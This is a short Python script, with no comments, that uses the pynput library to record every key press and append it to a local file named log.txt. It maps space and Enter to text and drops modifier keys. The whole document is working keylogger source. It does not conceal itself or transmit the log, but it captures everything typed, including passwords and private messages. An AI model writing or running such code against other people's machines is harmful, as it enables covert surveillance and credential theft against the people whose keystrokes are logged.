from pynput.keyboard import Key,Listener

def writetofile(key):
    mess = str(key)
    mess = mess.replace("'","")
    
    if mess == 'Key.space':
        mess = ' '
    if mess == 'Key.shift_r' or mess == 'Key.shift_l' or mess == 'Key.shift':
        mess = ''
    if mess == 'Key.alt_l' or mess == 'Key.alt_r' or mess == 'Key.alt_gr':
        mess = ''
    if mess == "Key.ctrl_r" or mess == "Key.ctrl_l" or mess == "Key.ctrl":
        mess = ""
    if mess == "Key.enter":
        mess = "\n"
    
    with open("log.txt",'a') as f:
        f.write(mess)
        
with Listener(on_press=writetofile) as l:
    l.join()